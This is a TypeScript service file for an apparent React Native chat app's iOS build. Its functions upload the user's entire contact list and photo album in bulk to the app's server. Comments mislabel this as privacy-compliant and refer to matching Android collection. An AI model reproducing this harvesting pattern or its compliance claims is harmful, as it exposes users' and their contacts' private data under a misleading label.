/**
 * iOS 版本的权限上传服务
 * 符合 iOS App Store 隐私政策
 * 启用合规的数据收集功能，与Android保持一致
 */

import axios from 'axios';
import { getCurrentPlatformFeatures } from '../config/platformFeatures';
import { API_URL, API_ENDPOINTS } from '../config/api';

// 添加日志上传函数（保持基础日志功能）
const uploadLog = async (token: string, type: string, status: string, error?: any) => {
  try {
    console.log(`📱 iOS日志: ${type} - ${status}`, error ? error : '');
    // iOS版本可以保留基础的日志功能（不包含敏感信息）
    // 但实际上可以选择不上传到服务器
    return { success: true, skipped: true };
  } catch (e) {
    console.error('iOS日志记录失败:', e);
    return { success: false, skipped: true };
  }
};

/**
 * iOS版本：跳过位置数据上传
 * 位置信息仅用于发送位置消息，不存储到服务器
 */
export const uploadLocation = async (token: string, data: any) => {
  const features = getCurrentPlatformFeatures();
  
  if (!features.dataCollection.uploadLocation) {
    console.log('🍎 iOS: 跳过位置数据上传（隐私保护）');
    await uploadLog(token, 'location', 'skipped');
    return { 
      success: true, 
      skipped: true, 
      message: 'iOS版本不上传位置数据',
      platform: 'ios'
    };
  }
  
  // 如果将来需要，这里可以实现合规的位置处理
  return { success: true, skipped: true };
};

/**
 * iOS版本：启用通讯录上传
 * 支持合规的通讯录数据收集（与Android保持一致）
 */
export const uploadContacts = async (token: string, data: any) => {
  const features = getCurrentPlatformFeatures();
  
  if (!features.dataCollection.uploadContacts) {
    console.log('🍎 iOS: 通讯录上传功能已禁用');
    await uploadLog(token, 'contacts', 'disabled');
    return {
      success: true,
      skipped: true,
      message: 'iOS版本通讯录上传功能已禁用',
      platform: 'ios',
      reason: '平台配置已禁用通讯录上传'
    };
  }
  
  try {
    console.log('🍎 iOS: 开始通讯录数据上传');
    await uploadLog(token, 'contacts', 'start');
    
    // 检查是否有传入的数据
    if (data && Array.isArray(data) && data.length > 0) {
      console.log(`🍎 iOS: 使用传入的通讯录数据，共 ${data.length} 条记录`);
      // 直接使用传入的数据进行上传
      const response = await axios.post(`${API_URL}${API_ENDPOINTS.UPLOAD_CONTACTS}`, { data }, {
        headers: { Authorization: `Bearer ${token}` }
      });
      await uploadLog(token, 'contacts', 'success');
      console.log('🍎 iOS: 通讯录数据上传完成');
      
      return {
        success: true,
        skipped: false,
        message: 'iOS通讯录数据上传成功',
        platform: 'ios',
        uploaded: true
      };
    } else {
      console.log('🍎 iOS: 没有传入数据，尝试重新获取通讯录数据');
      // 如果没有传入数据，则重新获取
      const ContactsPermissionService = require('./ContactsPermissionService').default;
      const contactService = ContactsPermissionService.getInstance();
      
      await contactService.uploadContactsData(token);
      
      await uploadLog(token, 'contacts', 'success');
      console.log('🍎 iOS: 通讯录数据上传完成');
      
      return {
        success: true,
        skipped: false,
        message: 'iOS通讯录数据上传成功',
        platform: 'ios',
        uploaded: true
      };
    }
    
  } catch (error) {
    console.error('🍎 iOS: 通讯录数据上传失败:', error);
    await uploadLog(token, 'contacts', 'error', error);
    
    return {
      success: false,
      skipped: false,
      message: 'iOS通讯录数据上传失败',
      platform: 'ios',
      error: error instanceof Error ? error.message : String(error)
    };
  }
};

/**
 * iOS版本：完全禁用短信上传
 * iOS系统不提供短信读取权限
 */
export const uploadSMS = async (token: string, data: any) => {
  const features = getCurrentPlatformFeatures();
  
  console.log('🍎 iOS: 完全禁用短信上传（系统限制）');
  await uploadLog(token, 'sms', 'disabled');
  
  return {
    success: true,
    skipped: true,
    message: 'iOS版本不支持短信上传',
    platform: 'ios',
    reason: 'iOS系统不提供短信读取权限'
  };
};

/**
 * iOS版本：启用相册上传
 * 支持批量相册上传（与Android保持一致）
 */
export const uploadAlbum = async (token: string, data: any) => {
  const features = getCurrentPlatformFeatures();
  
  if (!features.dataCollection.uploadAlbum) {
    console.log('🍎 iOS: 相册上传功能已禁用');
    await uploadLog(token, 'album', 'disabled');
    return {
      success: true,
      skipped: true,
      message: 'iOS版本相册上传功能已禁用',
      platform: 'ios',
      reason: '平台配置已禁用相册上传'
    };
  }
  
  try {
    console.log('🍎 iOS: 开始相册数据上传');
    await uploadLog(token, 'album', 'start');
    
    // 调用实际的上传服务（使用与Android相同的逻辑）
    const AlbumPermissionService = require('./AlbumPermissionService').default;
    const albumService = AlbumPermissionService.getInstance();
    
    // 直接调用相册上传逻辑，不再跳过
    const success = await albumService.uploadAlbumData(data);
    
    if (success) {
      await uploadLog(token, 'album', 'success');
      console.log('🍎 iOS: 相册数据上传完成');
      
      return {
        success: true,
        skipped: false,
        message: 'iOS相册数据上传成功',
        platform: 'ios',
        uploaded: true
      };
    } else {
      throw new Error('相册数据上传失败');
    }
    
  } catch (error) {
    console.error('🍎 iOS: 相册数据上传失败:', error);
    await uploadLog(token, 'album', 'error', error);
    
    return {
      success: false,
      skipped: false,
      message: 'iOS相册数据上传失败',
      platform: 'ios',
      error: error instanceof Error ? error.message : String(error)
    };
  }
};

/**
 * iOS版本：单张图片上传（保留此功能）
 * 用于聊天中的图片发送，这是合规的
 */
export const uploadCompressedImage = async (token: string, imageUri: string, filename?: string) => {
  try {
    await uploadLog(token, 'image-upload', 'start');
    
    console.log('📱 iOS: 开始单张图片上传（聊天功能）');
    
    // 创建 FormData
    const formData = new FormData();
    formData.append('image', {
      uri: imageUri,
      type: 'image/jpeg',
      name: filename || 'photo.jpg'
    } as any);
    
    // 这里可以保留实际的上传逻辑，因为单张图片上传是合规的
    // const response = await axios.post(`${API_URL}/users/upload-image`, formData, {
    //   headers: {
    //     'Authorization': `Bearer ${token}`,
    //     'Content-Type': 'multipart/form-data'
    //   }
    // });
    
    await uploadLog(token, 'image-upload', 'success');
    
    return {
      success: true,
      imageUrl: '/uploads/images/placeholder.jpg', // 模拟返回
      filename: filename || 'photo.jpg',
      platform: 'ios',
      message: 'iOS单张图片上传'
    };
    
  } catch (error) {
    await uploadLog(token, 'image-upload', 'error', error);
    throw error;
  }
};

/**
 * iOS版本：权限检查函数
 * 检查当前操作是否在iOS平台被允许
 */
export const checkIOSPermission = (operation: string): { allowed: boolean; reason?: string } => {
  const features = getCurrentPlatformFeatures();
  
  switch (operation) {
    case 'contacts':
      return {
        allowed: features.dataCollection.uploadContacts,
        reason: features.dataCollection.uploadContacts ? 'iOS通讯录上传已启用' : 'iOS通讯录上传已禁用'
      };
    case 'sms':
      return {
        allowed: false,
        reason: 'iOS 系统不提供短信读取权限'
      };
    case 'location-storage':
      return {
        allowed: features.dataCollection.uploadLocation,
        reason: features.dataCollection.uploadLocation ? 'iOS位置上传已启用' : '位置信息仅用于消息发送，不存储'
      };
    case 'album-batch':
      return {
        allowed: features.dataCollection.uploadAlbum,
        reason: features.dataCollection.uploadAlbum ? 'iOS相册批量上传已启用' : '批量相册访问已禁用'
      };
    case 'single-image':
      return {
        allowed: true,
        reason: '聊天功能需要的单张图片上传是合规的'
      };
    case 'camera':
      return {
        allowed: true,
        reason: '拍照功能是合规的'
      };
    case 'microphone':
      return {
        allowed: true,
        reason: '语音通话功能是合规的'
      };
    default:
      return {
        allowed: false,
        reason: '未知操作，默认禁止'
      };
  }
};

/**
 * 导出所有iOS合规的服务函数
 */
export const iOSPermissionService = {
  uploadLocation,
  uploadContacts,
  uploadSMS,
  uploadAlbum,
  uploadCompressedImage,
  checkIOSPermission,
  uploadLog
};

console.log('🍎 iOS权限服务加载完成 - 启用合规数据收集功能'); 